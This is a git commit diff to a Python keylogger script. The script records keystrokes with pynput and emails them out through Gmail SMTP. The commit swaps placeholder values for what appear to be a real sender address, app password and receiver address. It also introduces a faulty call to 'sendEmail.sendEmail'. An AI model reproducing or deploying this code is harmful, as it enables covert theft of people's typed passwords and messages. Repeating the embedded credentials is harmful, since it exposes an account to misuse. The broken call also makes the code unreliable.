08ce3c6b2683b9213c8ee59e3366b4b9d9a5cb1d
askaniaz <155850060+askaniaz@users.noreply.github.com>
2024-01-07 14:51:00 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,15 +1,14 @@
-import smtplib, ssl
 import pynput
 from pynput.keyboard import Key,Listener
-
+import smtplib, ssl
 
 
 def sendEmail(message):
     smtp_server = "smtp.gmail.com"
     port = 587
-    sender_email = "sender_mail"
-    password = "sender_mail_password"
-    receiver_email = "receiver_mail"
+    sender_email = "mehmetkzm55@gmail.com"
+    password = "bxga vwzx vmaw tbsu"
+    receiver_email = "julianjacops@gmail.com"
 
     context = ssl.create_default_context()
 
@@ -49,7 +48,7 @@ def email(keys):
             k = ""
 
         message += k
-    sendEmail(message)
+    sendEmail.sendEmail(message)
 
 def on_release(key):
     if key == Key.esc:
@@ -57,29 +56,3 @@ def on_release(key):
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
-
-
-
-
-
-def sendEmail(message):
-    smtp_server = "smtp.gmail.com"
-    port = 587
-    sender_email = "sender_mail"
-    password = "sender_mail_password"
-    receiver_email = "receiver_mail"
-
-    context = ssl.create_default_context()
-
-    try:
-        server = smtplib.SMTP(smtp_server, port)
-        server.ehlo()
-        server.starttls(context=context)
-        server.ehlo()
-        server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, message)
-
-    except Exception as e:
-        print(e)
-    finally:
-        server.quit()
